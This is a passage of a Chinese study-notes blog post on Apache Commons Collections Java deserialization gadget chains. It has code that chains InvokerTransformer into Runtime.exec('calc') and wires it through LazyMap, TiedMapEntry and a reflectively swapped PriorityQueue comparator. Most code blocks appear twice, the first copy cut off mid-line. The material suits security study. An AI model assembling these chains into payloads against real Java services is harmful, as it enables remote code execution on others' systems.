<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>Commons Collections 1-12</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>Commons Collections 1-12</h2><h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>一说JavaWeb安全就想到反序列化，一说反序列化就是CC链，那CC链是什么，这个链为什么这么重要呢？Apache Commons是Apache开源的Java通用类项目在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做Apache Commons Collections，主要封装了Java的Collection（集合）相关类对象。这个组件大部分项目都会用到，包含一些知名的中间件，组件的Transfomer接口的子类可执行代码，再加上各种其他基本库的反序列化配合，可衍生出一整系列的CC链导致远程代码执行，影响之广和其重要性可想而知。这条链至今可能有大几年了，各种jdk版本的机制、修复和绕过揉杂在一起，结果就是 复杂 + 混乱，下面是我学习的一点记录，试图捋清楚这些链。</p>
<p>在服务端会去验证要序列化的类在本机上是否存在，然后存在就去执行readObject，反序列化的前提在于找一个服务器上存在的类，并且这个类readObject的函数内部某些成员直接或间接可控，而核心在于通过这个可控的成员来构造、执行恶意代码。</p>
<h1 id="0x1-RCE的基础"><a href="#0x1-RCE的基础" class="headerlink" title="0x1 RCE的基础"></a>0x1 RCE的基础</h1><p>Commons Collections中的Transformer接口的子类，组合起来可以执行代码，跟一下细节就知道为什么能执行代码了，这里只捋思路</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs java">String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>  <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>&#125;;<br><br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>chainedTransformer.transform(<span class="hljs-keyword"><code class="language-hljs java">String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>  <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>    Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                        ),<br>  <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>&#125;;<br><br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>chainedTransformer.transform(<span class="hljs-keyword">null</span>);<br></code></pre></td></tr></table></figure>

<p>通过执行构造好的ChainedTransformer，执行transform方法即可弹出计算器，只要找到一个类readObject方法中有成员可以直接或间接执行transform就能RCE了，下面的LazyMap、TiedMapEntry、TransformingComparator、PriorityQueue、TemplatesImpl等方法皆意在于执行transform方法。</p>
<h1 id="0x2-执行Transform方法"><a href="#0x2-执行Transform方法" class="headerlink" title="0x2 执行Transform方法"></a>0x2 执行Transform方法</h1><p>在上面的基础上找出一些能帮我们方便执行chainedTransformer.transform的东西来，这些也是为什么能链的原因，通过下面的一些类进行相互组合，产生了CC1-7。</p>
<h2 id="0x2-1-LazyMap"><a href="#0x2-1-LazyMap" class="headerlink" title="0x2.1 LazyMap"></a>0x2.1 LazyMap</h2><p>这里不需要具体了解这个类为什么存在，只要大概观Lazymap名可猜出是Map的子类，重点看LazyMap为什么能执行transform:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">7990956402564206740L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br><br><br>		<span class="hljs-comment">// 静态方法获取实例</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> LazyMap(map, factory);<br>    &#125;<br><br>		<span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">this</span>.factory = factory;<br>        &#125;<br>    &#125;<br>		<br>		<span class="hljs-comment">// 核心在这</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.map.containsKey(key)) &#123;<br>						<span class="hljs-comment">// 当factory 为 chainedTransformr 实例，这个地方就可以执行</span><br>            Object value = <span class="hljs-keyword">this</span>.factory.transform(key);<br>            <span class="hljs-keyword">this</span>.map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.get(key);<br>        &#125;<br>    &#125;<br>  <br>		<span class="hljs-comment">// 这两个方法让LazyMap可以用来序列化</span><br>		<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        out.defaultWriteObject();<br>        out.writeObject(<span class="hljs-keyword">this</span>.map);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyMap</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractMapDecorator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Map</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">7990956402564206740L</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br><br><br>		<span class="hljs-comment">// 静态方法获取实例</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> LazyMap(map, factory);<br>    &#125;<br><br>		<span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">this</span>.factory = factory;<br>        &#125;<br>    &#125;<br>		<br>		<span class="hljs-comment">// 核心在这</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">get</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.map.containsKey(key)) &#123;<br>						<span class="hljs-comment">// 当factory 为 chainedTransformr 实例，这个地方就可以执行</span><br>            Object value = <span class="hljs-keyword">this</span>.factory.transform(key);<br>            <span class="hljs-keyword">this</span>.map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.get(key);<br>        &#125;<br>    &#125;<br>  <br>		<span class="hljs-comment">// 这两个方法让LazyMap可以用来序列化</span><br>		<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        out.defaultWriteObject();<br>        out.writeObject(<span class="hljs-keyword">this</span>.map);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        in.defaultReadObject();<br>        <span class="hljs-keyword">this</span>.map = (Map)in.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到当执行这个map.get的方法时即会执行ChainedTransformer.transform，所以需要有个类的readObject有可控的成员来执行map.get，那为什么要这样包一层呢，这是因为Map对象会更加常见些，也就是可利用的面会更加广一些。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class=" language-hljs java">HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>LazyMap lazyMapDecorate = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br>lazyMapDecorate.get(<span class="hljs-number"><code class="language-hljs java">HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>LazyMap lazyMapDecorate = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);<br>lazyMapDecorate.get(<span class="hljs-number">1234567</span>);<br></code></pre></td></tr></table></figure>



<h2 id="0x2-2-TiedMapEntry"><a href="#0x2-2-TiedMapEntry" class="headerlink" title="0x2.2 TiedMapEntry"></a>0x2.2 TiedMapEntry</h2><p>与上同理，TiedMapEntry在LazyMap上又包装了一层，通过TiedMapEntry的equals、hashCode、toString方法即可以触发map.get。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Entry</span>, <span class="hljs-title">KeyValue</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>        <span class="hljs-keyword">this</span>.key = key;<br>    &#125;<br><br>		<span class="hljs-comment">// this.map.get 可触发LazyMap</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.get(<span class="hljs-keyword">this</span>.key);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">setValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">this</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Cannot set value to this map entry&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.put(<span class="hljs-keyword">this</span>.key, value);<br>        &#125;<br>    &#125;<br><br>		<span class="hljs-comment">// 会调用 this.map.get 方法</span><br>		<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br><br>          Entry other = (Entry)obj;<br>          Object value = <span class="hljs-keyword">this</span>.getValue();<br><br>					<span class="hljs-comment">// 省略无关代码</span><br>        &#125;<br>    &#125;<br>		<br>		<span class="hljs-comment">// 会调用 this.map.get 方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>        Object value = <span class="hljs-keyword">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">this</span>.getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-keyword">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><br>		<span class="hljs-comment">// 会调用 this.map.get 方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getKey() + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Entry</span>, <span class="hljs-title">KeyValue</span>, <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">8453869361373831205L</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.map = map;<br>        <span class="hljs-keyword">this</span>.key = key;<br>    &#125;<br><br>		<span class="hljs-comment">// this.map.get 可触发LazyMap</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.get(<span class="hljs-keyword">this</span>.key);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">setValue</span><span class="hljs-params">(Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">this</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;Cannot set value to this map entry&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.map.put(<span class="hljs-keyword">this</span>.key, value);<br>        &#125;<br>    &#125;<br><br>		<span class="hljs-comment">// 会调用 this.map.get 方法</span><br>		<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">equals</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br><br>          Entry other = (Entry)obj;<br>          Object value = <span class="hljs-keyword">this</span>.getValue();<br><br>					<span class="hljs-comment">// 省略无关代码</span><br>        &#125;<br>    &#125;<br>		<br>		<span class="hljs-comment">// 会调用 this.map.get 方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>        Object value = <span class="hljs-keyword">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">this</span>.getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-keyword">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><br>		<span class="hljs-comment">// 会调用 this.map.get 方法</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getKey() + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-keyword">this</span>.getValue();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>此时找到一个类readObject中有可控的toString、equals、hashCode方法即可RCE。</p>
<h2 id="0x2-3-TransformingComparator"><a href="#0x2-3-TransformingComparator" class="headerlink" title="0x2.3 TransformingComparator"></a>0x2.3 TransformingComparator</h2><p>TransformingComparator的compare方法可执行transform方法，也能用来配合TemplateImpl的newTransformer方法。</p>
<p>注意这个类在4.0版本才继承了Serializable，可序列化。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformingComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> Comparator decorated;<br>    <span class="hljs-keyword">protected</span> Transformer transformer;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(Transformer transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, <span class="hljs-keyword">new</span> ComparableComparator());<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(Transformer transformer, Comparator decorated)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.decorated = decorated;<br>        <span class="hljs-keyword">this</span>.transformer = transformer;<br>    &#125;<br>		<br>		<span class="hljs-comment">// 执行transform</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> </span>&#123;<br>        Object value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<br>        Object value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TransformingComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparator</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> Comparator decorated;<br>    <span class="hljs-keyword">protected</span> Transformer transformer;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(Transformer transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, <span class="hljs-keyword">new</span> ComparableComparator());<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(Transformer transformer, Comparator decorated)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.decorated = decorated;<br>        <span class="hljs-keyword">this</span>.transformer = transformer;<br>    &#125;<br>		<br>		<span class="hljs-comment">// 执行transform</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Object obj1, Object obj2)</span> </span>&#123;<br>        Object value1 = <span class="hljs-keyword">this</span>.transformer.transform(obj1);<br>        Object value2 = <span class="hljs-keyword">this</span>.transformer.transform(obj2);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decorated.compare(value1, value2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>TransformingComparator的compare可以触发chainedTransformer，而PriorityQueue的readObject中有可控的compare方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre class=" language-hljs Java">TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// 反射修改comparator</span><br>Field comparator = priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>comparator.setAccessible(<span class="hljs-keyword"><code class="language-hljs Java">TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>priorityQueue.add(<span class="hljs-number">1</span>);<br>priorityQueue.add(<span class="hljs-number">2</span>);<br><br><span class="hljs-comment">// 反射修改comparator</span><br>Field comparator = priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>comparator.set(priorityQueue, transformingComparator);<br></code></pre></td></tr></table></figure>



<h2 id="0x2-4-TemplateImpl"><a href="#0x2-4-TemplateImpl" class="headerlink" title="0x2.4 TemplateImpl"></a>0x2.4 TemplateImpl</h2><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl是jdk自带的类，通过执行newTransformer方法可以构造一个类出来。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre class=" language-hljs java"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Contains the actual class definition for the translet class and</span><br><span class="hljs-comment">* any auxiliary classes.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[][] _bytecodes = <span class="hljs-keyword">null</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* Contains the translet class definition(s). These are created when</span><br><span class="hljs-comment">* this Templates is created or when it is read back from disk.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> Class[] _class = <span class="hljs-keyword">null</span>;<br><br><br><span class="hljs-comment">// 核心方法1，newTransformer</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Transformer <span class="hljs-title">newTransformer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException</span><br><span class="hljs-function"></span>&#123;<br>    TransformerImpl transformer;<br>		<span class="hljs-comment">// getTransletInstance可以创建实例</span><br>    transformer = <span class="hljs-keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,<br>                                      _indentNumber, _tfactory);<br><br>    <span class="hljs-keyword">if</span> (_uriResolver != <span class="hljs-keyword">null</span>) &#123;<br>        transformer.setURIResolver(_uriResolver);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;<br>        transformer.setSecureProcessing(<span class="hljs-keyword">true</span>);<br>    &#125;<br>    <span class="hljs-keyword"><code class="language-hljs java"><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 